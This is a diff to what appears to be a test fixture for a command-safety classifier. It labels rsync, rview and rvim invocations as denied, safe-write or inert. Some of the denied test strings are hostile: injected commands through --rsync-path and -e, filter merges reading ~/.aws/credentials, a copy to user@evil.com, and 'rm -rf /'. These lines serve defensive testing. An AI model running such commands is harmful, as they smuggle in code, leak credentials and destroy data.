@@ -24,6 +24,9 @@ RACK_ENV=test rm -rf /	denied
 RAILS_ENV=test bundle exec rspec	safe-read
 RAILS_ENV=test echo foo > bar	safe-write
 RIPGREP_CONFIG_PATH=/tmp/rc rg foo	denied
+RSYNC_RSH='ssh -p 22' rsync x:foo dst/	safe-write
+RSYNC_RSH=sh rsync x:foo dst/	denied
+RSYNC_RSH=ssh rsync x:foo dst/	safe-write
 ResMerger	denied
 ResMerger --help	denied
 ResMerger --version	denied
@@ -5256,7 +5259,7 @@ rsync --fake-super	safe-write
 rsync --fileflags	safe-write
 rsync --files-from	safe-write
 rsync --files-from x	safe-write
-rsync --filter	safe-write
+rsync --filter	denied
 rsync --filter x	safe-write
 rsync --force	safe-write
 rsync --from0	safe-write
@@ -5331,7 +5334,11 @@ rsync --out-format x	safe-write
 rsync --owner	safe-write
 rsync --partial	safe-write
 rsync --partial-dir	safe-write
+rsync --partial-dir /abs src/ dst/	denied
 rsync --partial-dir x	safe-write
+rsync --partial-dir=.rsync-partial src/ dst/	safe-write
+rsync --partial-dir=/abs src/ dst/	denied
+rsync --partial-dir=~/x src/ dst/	denied
 rsync --password-file	safe-write
 rsync --password-file x	safe-write
 rsync --perms	safe-write
@@ -5349,19 +5356,31 @@ rsync --read-batch	safe-write
 rsync --read-batch x	safe-write
 rsync --recursive	safe-write
 rsync --relative	safe-write
-rsync --remote-option	safe-write
-rsync --remote-option x	safe-write
+rsync --remote-option	denied
+rsync --remote-option x	denied
 rsync --remove-source-files	safe-write
-rsync --rsh	safe-write
-rsync --rsh x	safe-write
-rsync --rsync-path	safe-write
-rsync --rsync-path x	safe-write
+rsync --rsh	denied
+rsync --rsh sh x:foo dst/	denied
+rsync --rsh x	denied
+rsync --rsh='ssh -p 22 -o BatchMode=yes' x:foo dst/	safe-write
+rsync --rsh=sh x:foo dst/	denied
+rsync --rsh=ssh x:foo dst/	safe-write
+rsync --rsync-path	denied
+rsync --rsync-path 'sudo rsync' host:src/ dst/	denied
+rsync --rsync-path rsync host:src/ dst/	safe-write
+rsync --rsync-path x	denied
+rsync --rsync-path='rsync;id' host:src/ dst/	denied
+rsync --rsync-path='sh -c id' host:src/ dst/	denied
+rsync --rsync-path=/bin/sh host:src/ dst/	denied
+rsync --rsync-path=/usr/local/bin/rsync host:src/ dst/	safe-write
 rsync --safe-links	safe-write
 rsync --secluded-args	safe-write
 rsync --secret	safe-write
 rsync --secret-file	safe-write
 rsync --secret-file x	safe-write
-rsync --server	safe-write
+rsync --server	denied
+rsync --server --sender -vlogDtpre.iLsfxC . src/	denied
+rsync --server src/ dst/	denied
 rsync --size-only	safe-write
 rsync --skip-compress	safe-write
 rsync --skip-compress x	safe-write
@@ -5380,7 +5399,10 @@ rsync --suffix	safe-write
 rsync --suffix x	safe-write
 rsync --super	safe-write
 rsync --temp-dir	safe-write
+rsync --temp-dir /abs src/ dst/	denied
 rsync --temp-dir x	safe-write
+rsync --temp-dir=./tmp src/ dst/	safe-write
+rsync --temp-dir=/abs src/ dst/	denied
 rsync --timeout	safe-write
 rsync --timeout x	safe-write
 rsync --times	safe-write
@@ -5407,7 +5429,7 @@ rsync -I	safe-write
 rsync -J	safe-write
 rsync -K	safe-write
 rsync -L	safe-write
-rsync -M	safe-write
+rsync -M x	denied
 rsync -N	safe-write
 rsync -O	safe-write
 rsync -P	safe-write
@@ -5415,6 +5437,7 @@ rsync -R	safe-write
 rsync -S	safe-write
 rsync -T	safe-write
 rsync -T x	safe-write
+rsync -T/abs src/ dst/	denied
 rsync -U	safe-write
 rsync -V	safe-write
 rsync -W	safe-write
@@ -5422,13 +5445,58 @@ rsync -X	safe-write
 rsync -Z	safe-write
 rsync -a	safe-write
 rsync -a --chmod=D2775,F644 src/ dst/	denied
+rsync -a --log-file /etc/rsync.log src/ dst/	denied
+rsync -a --log-file=./rsync.log src/ dst/	safe-write
+rsync -a --log-file=/etc/rsync.log src/ dst/	denied
+rsync -a --remote-option --chmod=u+s src/ dst/	denied
+rsync -a --remote-option --fake-super src/ dst/	safe-write
+rsync -a --remote-option=- src/ dst/	denied
+rsync -a --remote-option=--chmod=go-w src/ dst/	safe-write
+rsync -a --remote-option=--chmod=u+s src/ dst/	denied
+rsync -a --remote-option=--fake-super src/ dst/	safe-write
+rsync -a --remote-option=--log-file=/etc/rsync.log src/ dst/	denied
+rsync -a --server src/ dst/	denied
+rsync -a --write-batch=/etc/batch src/ dst/	denied
+rsync -a -M - src/ dst/	denied
+rsync -a -M --chmod=Fu+s src/ dst/	denied
+rsync -a -M --chmod=go-w src/ dst/	safe-write
+rsync -a -M --fake-super src/ dst/	safe-write
+rsync -a -M --temp-dir src/ dst/	denied
+rsync -a -M -T src/ dst/	denied
+rsync -a -M -e src/ dst/	denied
+rsync -a -M -ve src/ dst/	denied
+rsync -a -M foo src/ dst/	denied
+rsync -a -M--chmod=g+s src/ dst/	denied
+rsync -a -M--fake-super src/ dst/	safe-write
+rsync -a -M--rsync-path=sh src/ dst/	denied
+rsync -a -M--server src/ dst/	denied
+rsync -a -M--xyzzy src/ dst/	denied
+rsync -a -M-esh src/ dst/	denied
 rsync -a ./ user@evil.com:/tmp	denied
+rsync -a src/ dst/ --remote-option	denied
+rsync -aM--chmod=4755 src/ dst/	denied
+rsync -ave sh x:foo dst/	denied
+rsync -avesh x:foo dst/	denied
+rsync -avessh x:foo dst/	safe-write
 rsync -b	safe-write
 rsync -c	safe-write
 rsync -d	safe-write
-rsync -e	safe-write
-rsync -e x	safe-write
-rsync -f	safe-write
+rsync -e	denied
+rsync -e '/tmp/x/tool -p 22' x:foo dst/	denied
+rsync -e '/usr/bin/ssh -l x' x:foo dst/	safe-write
+rsync -e 'ssh -o ProxyCommand=id' x:foo dst/	denied
+rsync -e 'ssh -p 22 -F ./cfg' x:foo dst/	denied
+rsync -e 'ssh -p 22' src/ dst/	safe-write
+rsync -e 'ssh -p 22' x:foo dst/	safe-write
+rsync -e ../../x/ssh x:foo dst/	denied
+rsync -e /tmp/ssh x:foo dst/	denied
+rsync -e /usr/bin/ssh x:foo dst/	safe-write
+rsync -e bash x:foo dst/	denied
+rsync -e make x:foo dst/	denied
+rsync -e sh x:foo dst/	denied
+rsync -e ssh x:foo dst/	safe-write
+rsync -e x	denied
+rsync -f	denied
 rsync -f x	safe-write
 rsync -g	safe-write
 rsync -h	safe-write
@@ -5437,6 +5505,18 @@ rsync -k	safe-write
 rsync -l	safe-write
 rsync -m	safe-write
 rsync -n	safe-write
+rsync -n --filter '+ *.rs' src/ dst/	safe-write
+rsync -n --filter 'merge,- ~/.aws/credentials' src/ dst/	denied
+rsync -n --filter='- *.o' src/ dst/	safe-write
+rsync -n --filter='. /etc/hosts' src/ dst/	denied
+rsync -n --filter=':n- x' src/ dst/	denied
+rsync -n --filter='dir-merge,n- x' src/ dst/	denied
+rsync -n --filter='merge ~/.npmrc' src/ dst/	denied
+rsync -n --filter=merge_x src/ dst/	denied
+rsync -n -M--filter=merge_x src/ dst/	denied
+rsync -n -f '. x' src/ dst/	denied
+rsync -n src/ dst/ --filter	denied
+rsync -nf. src/ dst/	denied
 rsync -o	safe-write
 rsync -p	safe-write
 rsync -q	safe-write
@@ -5824,10 +5904,8 @@ rview --clean --help	inert
 rview --clean -T x	inert
 rview --clean x	inert
 rview --help	inert
-rview --log	inert
 rview --noplugin	inert
 rview --not-a-term	inert
-rview --startuptime	inert
 rview --ttyfail	inert
 rview --version	inert
 rview -C	inert
@@ -5858,10 +5936,8 @@ rvim --clean --help	inert
 rvim --clean -T x	inert
 rvim --clean x	inert
 rvim --help	inert
-rvim --log	inert
 rvim --noplugin	inert
 rvim --not-a-term	inert
-rvim --startuptime	inert
 rvim --ttyfail	inert
 rvim --version	inert
 rvim -C	inert
